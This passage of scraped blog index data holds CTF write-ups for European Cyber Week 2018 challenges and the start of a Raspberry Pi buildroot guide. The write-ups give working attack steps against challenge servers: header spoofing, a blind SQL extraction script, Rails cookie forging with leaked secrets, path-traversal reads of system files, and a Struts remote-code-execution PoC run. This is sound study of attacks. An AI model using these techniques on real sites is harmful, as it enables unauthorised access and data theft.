","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:5:0","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"State of the art Do you remember the binary file in the zip archive in the Drone Wars 1 challenge? The Capture.bin one. Thanks to the Drone Wars 2 hint, we now know that we have to use GNU Radio. File source, GFSK demode, etc… Are GNU Radio blocks to decode a source file. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:5:1","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"GNU Radio I choose this configuration: File source -\u003e GFSK Demod: Complex mode GFSK Demod -\u003e Packet decoder -\u003e File Sink: Byte mode Let’s run this, and see what kind of data there is in our toto.bin file: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:5:2","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"GPS to ASCII By googling gps to ascii, I found this website: http://www.gpsvisualizer.com/convert_input I format my toto.bin into a valid CSV file for this website: ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:5:3","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Flag And then (when zooming): ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018dronewars/:5:4","tags":["ecw","thales","airbus","rf","radiofrequency"],"title":"[European Cyber Week] - Drone wars","uri":"maki.bzh/writeups/ecw2018dronewars/"},{"categories":["Writeups"],"content":"Intrusion 1/4 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:1:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art I start this challenge with a website: web150-smartstuff.challenge-ecw.fr Nothing really interesting at first glance. After digging a bit in HTML source code, I notice 2 pages: thor.css thor.js ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:1:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Thor.css When I checked this file, I noticed a different subdomain: web150_dev.challenge-ecw.fr ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:1:2","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Flag Then I just curl this new subdomain: $ curl -v -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr [...] ECW{5822a94206522fe5382d2f00acc5cadf} [...] ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:1:3","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Intrusion 2/4 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:2:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art Ok, now we’re on the dev platform. After a lot of fuzzing, I finally find a bug. When I’m sending OPTIONS HTTP request, I get a weird output: $ curl -v -X OPTIONS -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:2:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"X-Forwarded-For spoofing In the previous Figure, we notice something interesting: HTTP_F_FORWARDED_FOR: “176.187.238.100, 10.1.0.10, 127.0.0.1” In a previous CTF and in real-world pentests, I already came across this kind of WAF. It only allows connections from precise IP addresses, such as 127.0.0.1. $ curl -X OPTIONS -H 'X-Forwarded-For: 127.0.0.1' -H 'User-Agent: Chrome' https://web150_dev.challenge-ecw.fr/ It’s a Ruby webconsole. I used those lines to display the content of the directories and the files: Dir['*'] File.open('file').readlines() ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:2:2","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Flag After looking over some files, I finally open config/initializers/web_console.rb: Unhex string gives us: ECW{5948462211d00c9cec468fd194e76c5f} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:2:3","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Intrusion hint ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:3:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art This time, it’s not on the dev platform, it’s on a new website: Maybe something with LIKE in SQL: 5 hints found in the database. Let’s extract them :) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:3:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Data extraction I guess one of them is the flag. The payload looks like: [char]* So I did this little script (do you remember my ugly script in AdmYSsion?): import requests import string partial = '' no_pass = True charset = string.hexdigits+'}' url = 'https://web150-hint.challenge-ecw.fr/search' nogo = '1 hint found' while no_pass: no_pass = False for i in charset: payload = 'ECW'+str(partial+i)+'%' r = requests.post(url, data = {'request': payload}) if nogo in r.text: no_pass = True partial += i print('Found: '+partial) break print(partial) ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:3:2","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Hints I edit the script to extract all the hints: https://gist.github.com/mbyczkowski/34fb691b4d7a100c32148705f244d028 http://manpages.ubuntu.com/manpages/cosmic/en/man1/systemctl.1.html /home/web200/smart_stuff/config/initializers/web_console.rb /home/web200/smart_stuff/config/secrets.yml ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:3:3","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Flag Then the flag: ECW{ebbbb414c38020906fd34bdd49ceea36} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:3:4","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Intrusion 3/4 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:4:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art Go back to the dev platform, the real challenge is starting. One of the previous hints mentioned secrets.yml: # Be sure to restart your server when you modify this file. # Your secret key is used for verifying the integrity of signed cookies. # If you change this key, all old signed cookies will become invalid! # Make sure the secret is at least 30 characters and all random, # no regular words or you'll be exposed to dictionary attacks. # You can use `rails secret` to generate a secure secret key. # Make sure the secrets in this file are kept private # if you're sharing your code publicly. # Shared secrets are available across all environments. # shared: # api_key: a1B2c3D4e5F6 # Environmental secrets are only available for that specific environment. development: secret_key_base: 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59 test: secret_key_base: 1cd775a1587363d69a47ce39af7e7ff13ea1b2f10dbc3a92bed16ac05436c2493be22280deee4fde699a88208b2de3738ae1257208002b2b1f32029bb096717e # Do not keep production secrets in the unencrypted secrets file. # Instead, either read values from the environment. # Or, use `bin/rails secrets:setup` to configure encrypted secrets # and move the `production:` environment over there. production: secret_key_base: \u003c%= ENV[\\\"SECRET_KEY_BASE\\\"] %\u003e In another previous hint, the GitHub repository gave us a script able to decrypt Ruby on Rails cookies: require 'cgi' require 'json' require 'active_support' def verify_and_decrypt_session_cookie(cookie, secret_key_base) cookie = CGI::unescape(cookie) salt = 'encrypted cookie' signed_salt = 'signed encrypted cookie' key_generator = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000) secret = key_generator.generate_key(salt)[0, ActiveSupport::MessageEncryptor.key_len] sign_secret = key_generator.generate_key(signed_salt) encryptor = ActiveSupport::MessageEncryptor.new(secret, sign_secret, serializer: JSON) encryptor.decrypt_and_verify(cookie) end Then to decrypt my cookie I need: My Cookie (of course) salt signed_salt secret_key_base of the dev platform ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:4:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Decrypting the cookie To obtain salt and signed_salt, I have to display ./config/application.rb: salt: ECW-secret-salt signed-salt: ECW-signature-secret-salt /!\\ config.action_dispatch.cookies_serializer = :marshal in application.rb !!! It’s not JSON formatted, it’s Marshal formatted, and Marshal from Python and Ruby are different… I got the secret_key_base in secrets.yml file: 08c89a3c48235a3e7211c1b7d3a239687929455cf8b6e3bc1c37ad5b4e937f0e9a5d0f3e62731375f099b692ae17e0852ee047d65ced240b7a38910e2ed06e59 And the cookie: NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyYmhIR0ZnUFE4cEdZaitSMlBPYnBUN2s5c2MzekVGOG9Ua2dKMngweDkxRTRXM3lTWkIxVW4yWHNLUXZYd3FPZWtIS3M2ZlN0bjJIQUw0Y1ZJZXNpN3lSeGVpYXNLcGxPVjZ6WnFqaWNLMVowYmVPTy93aUQrV2VlWWI4MGIvcVYxeThuMmJkWjVnQVMrOEFtRW9NNGVzNm0vNFlFbE4zWTZVSTh6VmYyRUtsb3N5b3MxZnB0UysrMWJWWGM1ckpORjlPMW9KOGNjQzBCbnA0TEN4WUdhd00xdWNkbTAwNG4zYmJNRGJlRm1ScEhKRS9OSEd6NDE5R0dKOERmZHdRcmVyNFlwbGowdnVTQjFxSFVhL2ZuZG52dFNsM3FEU3AvMFZzaTVQbXE0bkJXNmpVUXV1YzlCL0NvcFlBUjhzVU44V3I5Lzh1YlhuUWFFS3VVcU52Z20xMmY1OU5mS1hqQ0xGMVd2NGs5RG5PaU9OcGp2YmUwMkFzeWpYdExDaGRrSHo3RTQyeTkwTzE0bkhldXlxQ0hCRmJlbmlPN3UzeXFzUkNwZGNzVmcwNllLRzZnSUtMT0pZN3NHRHp2S2ZmNjNMRTRqdDhQS3hTRG1NYVlkRHEzenBIdHBkbURnYmRYTDUzOHNEcWxQcmN2VmpkQi0tamVLWVpBZHFVcUdkd2EzWnJPNUFaQT09--9d215e2f0ade6d2657279fca4b2516d0c07b97da I believed naively that I could use the decryption script on my laptop without any troubles… After a few hours of me going crazy, I had an illumination. I want to run a ruby script, I have a web console in ruby, YES! Here is my beautiful decryption script with all the variables put together: cookie = NC9XWkNHT0lKMytId0E2cjdBQ1dKSnVSZ1MyeTV4elRsK0VHK1hrR1drSmJ4eEEzakU2TDhoTGZPWk9tZXZCZDhUemhHckF3NXU4bXIvdTZKWHQwQ3c1UXRVNkJoNm9ueFROYkYwZGdCZFhjSmNvR09LTityYi94dkJDVXZwNXpXNGFLZGNNSmJmdThtRE1iZGtwbmVWSFhOQ1ZBSUE3bGdWM3grUWhSb1hQWjdCd3NrbHJXaE40WXN5ekw3NHpmZlpzdlN1eTZoYmhhK01pSlNVV1dhWG4vM3J1a1VHcDh2TVI0VHVYbEY1NG1sSHBUUFNBRUJlaDdIdGVxcHd2Vk5kelVkMVJrZFZnd24zOWZQdXVJbjF2Tk8rUjRVSTUza0h5djNGWWVxd2dRdGVhMS9XMXZ4KytuZDFxeVc1V25GMW9CbmtQNUF0cEJGcTJ6MUtqc2ZsOE9icE5MZlU5cTFaeS9QSlN0ZjdNTkw4ZFNnOUhRWjdoTVdpbmFUdnBOZXV2djJOVm9nOWpiNEJnQ0ljLzJ5dHBjZGdPb3pyU1hzOUY0SUFtMVF4Y3VYODFvb04wemozV2puRUVTMnBUM2RDcjBnQ1N1R253aW1iVTlPNFYwQ1dxUTdRTUVVaGRnc3BWMXNiZ3VWWE5ReEJabmRaZ2xWY3FWTEZBL1dJYjF6all4bXcrNGg5cWx6aXNwVzBqVlVIQ1N0ajYzOHBPcU1BRmhwOGR6c2xQbUxNakFuVXdCcDd2VElnZHpEdDdyRHhYQVA1cm04TWo1VUdGVXNuQVVkUUt5VEVNUHQwOEhOL1JYcXpuaWhiVzNpN2hVemxqU2l3b2xUK1crazhEN2xKZFNnWTg3NU9lSms5UFdHM2JDQU0xQnRacWp1bTBVN21TVDRWME1BWEtwM3BvamdiMnJBYjEyRlkxUWJuWjdYc0ROUU12bGRxQ0VYNjhzZkpZbDBTWTVhdjdMWENSZW9HRXBZWHgzbDVoQjFtMHR2cHJrZnhidWRUNzlualIzZFl2aWliUVcrQ1RFNzBLY3hqV2lsZTVxZnpYOXMzREtJRUJQamJOZDlqZ1p3blkxemtsblB5S0pPNmF6dkVZSjFLNGE3Q2dqMHVJdkdUWC96d1Vzc2l2QXBIZkREdzRHU2FpWVp1S3VnR216ajJCdE9qU3NYbHlyZmZkdWlYUFVRSFZIbU9WUzA4RXBBQlRyY","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:5:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Cookie crafting I don’t have any screenshots of this part or any logs… But to craft a new admin cookie, you just have to set those fields: id: Any number name: Any name admin: true In Ruby, it works like a dictionnary in Python: \u003e\u003e a = {\"session_id\"=\u003e\"BLAH\", \"user\"=\u003e#\u003cUser id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil\u003e} \u003e\u003e a['user']['name'] = admin =\u003e \"admin\" \u003e\u003e a['user']['id'] = 1 =\u003e 1 \u003e\u003e a['user']['admin'] = true =\u003e true The encryption key and salt are already in memory, just use this function: b = encryptor.encrypt_and_sign(a) [Big cookie] ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:5:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Connect as admin Just open Local storage in your Web developers tools and overwrite your existing cookie, and… W00t! We’re the admin of the dev platform!… BUT IT’S USELESS!!! ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:5:2","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Flag Go back to the hints and look at the one mentionning systemd. After a few minutes of digging, I got this: ECW{172ce5c14098e888a09053c0518bda08} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:5:3","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Intrusion 4/4 ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:6:0","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art Well, now we have to get the admin access on the production platform. I have the secret_key_base key: secret_key_base of prod: A_cookie_of_course ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:6:1","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Crafting admin cookie In the previous challenge, when I said it was “useless” to be the admin of the dev platform, it wasn’t true. It taught me how to decrypt and craft cookies. Now I just have to take the prod cookie, decrypt it and I get the session_id. {\"session_id\"=\u003e\"PROD SESSION ID\", \"user\"=\u003e#\u003cUser id: nil, name: nil, password: nil, salt: nil, admin: nil, created_at: nil, updated_at: nil\u003e} I fill the fields with the appropriate data and encrypt_and_sign the cookie with the new secret_key_base. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:6:2","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"Flag I just overwrite my old cookie with my fresh one, and finally go on the /admin/ page on prod: ECW{2c9ff616d19419cc9ca91f5b0829e802} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018intrusion/:6:3","tags":["ecw","thales","airbus","pentest","ruby","ruby on rails","web","sqli","marshall"],"title":"[European Cyber Week] - Intrusion","uri":"maki.bzh/writeups/ecw2018intrusion/"},{"categories":["Writeups"],"content":"State of the art A nice cyber-hacker-haxxor-website-of-death containing a magical robots.txt file: User-agent: * Disallow: /notinterestingfile.php ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018sysia/:1:0","tags":["ecw","thales","airbus","web","lfi","updatedb"],"title":"[European Cyber Week] - SysIA","uri":"maki.bzh/writeups/ecw2018sysia/"},{"categories":["Writeups"],"content":"Local file include Let’s try something: https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt❌104:65534::/nonexistent:/bin/false Ok, it works, there is only one user with a /bin/bash. I can’t display any other web page via LFI, I think I’ll try to display the .bash_history: https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../root/.bash_history It worked (I will just put a snippet below because it’s veeeeery long): docker exec -it CTFd_NDH_2018 /bin/sh ll mkdir ndh cd ndh/ locate flag.txt updatedb locate flag.txt ll nano Dockerfile nano proxy.py docker build . -n CTFd_ndh ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018sysia/:2:0","tags":["ecw","thales","airbus","web","lfi","updatedb"],"title":"[European Cyber Week] - SysIA","uri":"maki.bzh/writeups/ecw2018sysia/"},{"categories":["Writeups"],"content":"Flag location Ok, he did an updatedb, so the location of flag.txt is stored in this database. The default path is: /var/lib/mlocate/mlocate.db https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/lib/mlocate/mlocate.db ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018sysia/:3:0","tags":["ecw","thales","airbus","web","lfi","updatedb"],"title":"[European Cyber Week] - SysIA","uri":"maki.bzh/writeups/ecw2018sysia/"},{"categories":["Writeups"],"content":"Flag https://web075-sysia.challenge-ecw.fr/notinterestingfile.php?page=../../../../../../../var/www/ECW/solution/web/lfi/flag.txt ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018sysia/:4:0","tags":["ecw","thales","airbus","web","lfi","updatedb"],"title":"[European Cyber Week] - SysIA","uri":"maki.bzh/writeups/ecw2018sysia/"},{"categories":["Writeups"],"content":"State of the art A marvelous Java website, I looooove Java (joke.), so the flag appears to have been stolen: I had to guess the flag.jsp page: On md5decrypt.net, this hash gives us: swp, it looks like a backup file of vim. Let’s try something like .flag.jsp.swp. ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018trolljsp/:1:0","tags":["ecw","thales","airbus","jsp","web","equifax","rce"],"title":"[European Cyber Week] - Troll.jsp","uri":"maki.bzh/writeups/ecw2018trolljsp/"},{"categories":["Writeups"],"content":"Backup file Oh, looks like we have the code of the flag.jsp page: \u003c%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%\u003e \u003c%@ taglib prefix = \"s\" uri = \"/struts-tags\" %\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eFlag page!\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003c!--TODO change the flag --\u003e \u003cs:set var='flag' value='%{\"ECW{2f3f3238f9a5783fe4767d77e53aaf3b}\"}'/\u003e \u003cs:set var='trollFlag' value='%{\"ECW{a9ec6fc4217038a6f91294b8e5ed9933}\"}'/\u003e \u003cs:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/\u003e \u003cp\u003e Congratz! You got a flag: \u003cs:property value = \"result\"/\u003e \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e The new hash is still a fake flag. On md5decrypt, it gives us equifax. https://www.zdnet.fr/actualites/faille-apache-struts-equifax-veut-noyer-le-poisson-39857358.htm Well, it’s an Apache struts vulnerability. There are a lot of GitHub repositories exploiting this vulnerability, here is one of them: https://github.com/jas502n/st2-046-poc ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018trolljsp/:2:0","tags":["ecw","thales","airbus","jsp","web","equifax","rce"],"title":"[European Cyber Week] - Troll.jsp","uri":"maki.bzh/writeups/ecw2018trolljsp/"},{"categories":["Writeups"],"content":"Exploitation I just execute the GitHub script: $ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'find . -ls | grep flag' [...] 6556060 12 -rw-r----- 1 tomcat tomcat 11530 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.class 6556061 16 -rw-r----- 1 tomcat tomcat 16046 Aug 22 13:35 ./opt/tomcat/work/Catalina/localhost/ECW/org/apache/jsp/flag_jsp.java 6556025 4 -rwxr-xr-x 1 root root 2249 Aug 22 13:35 ./opt/tomcat/webapps/ECW/flag.jsp 6556001 4 -rwxr-xr-x 1 root root 556 Aug 22 13:34 ./opt/tomcat/webapps/ECW/.flag.jsp.swp [...] $ bash ./exploit-cd.sh https://web125-trolljsp.challenge-ecw.fr/.flag.jsp.swp 'cat ./opt/tomcat/webapps/ECW/flag.jsp' [...] \u003c/a\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/nav\u003e\u003cs:set var='flag' value='%{\"ECW{babde20f76698360d6f1a500b821e797}\"}'/\u003e\u003cs:set var='trollFlag' value='%{\"ECW{a9ec6fc4217038a6f91294b8e5ed9933}\"}'/\u003e\u003cs:set var='result' value='%{#session.flag!=null?#flag:#trollFlag}'/\u003e \u003cdiv class=\"container\"\u003e \u003cdiv class=\"row\"\u003e \u003cdiv class=\"col-lg-12 text-center\"\u003e \u003cp class=\"lead\"\u003eNow that's a flag! \u003cs:property value = \"result\"/\u003e\u003c/p\u003e [...] ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018trolljsp/:3:0","tags":["ecw","thales","airbus","jsp","web","equifax","rce"],"title":"[European Cyber Week] - Troll.jsp","uri":"maki.bzh/writeups/ecw2018trolljsp/"},{"categories":["Writeups"],"content":"Flag ECW{babde20f76698360d6f1a500b821e797} ","date":"2018-10-22","objectID":"maki.bzh/writeups/ecw2018trolljsp/:4:0","tags":["ecw","thales","airbus","jsp","web","equifax","rce"],"title":"[European Cyber Week] - Troll.jsp","uri":"maki.bzh/writeups/ecw2018trolljsp/"},{"categories":["Shorts"],"content":"How to build a custom Linux firmware on Raspberry Pi using buildroot.","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"I. Step 1 In this first part, we had to set up the buildroot system basis. Goals of this part are: Minimal buildroot configuration Copy the new firmware on RPi SD card ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:1:0","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using buildroot","uri":"maki.bzh/shorts/customfirmwarerpi3/"},{"categories":["Shorts"],"content":"I.1. Base system specification After downloaded the last release of buildroot, I prepared the build for Raspberry Pi 3 architecture. make raspberrypi3_defconfig In this interface “menuconfig”, I have to initiate the RAM filesystem: Filesystem images → initial RAM filesystem linked into linux kernel Furthermore, as we can see in the picture above, I disabled the ext3/4 filesystem, it’s not necessary here. I defined the root password: System configuration → Root password I also changed the hash function, MD5 or SHA1 are deprecated. The toolchain requested is Linario ARM, then I have to configure buildroot to use an external toolchain: Toolchain → Toolchain type → External toolchain ","date":"2018-10-05","objectID":"maki.bzh/shorts/customfirmwarerpi3/:1:1","tags":["rpi","buildroot","ensibs","firmware","iot","embedded"],"title":"Custom firmware for Rapsberry Pi 3 using 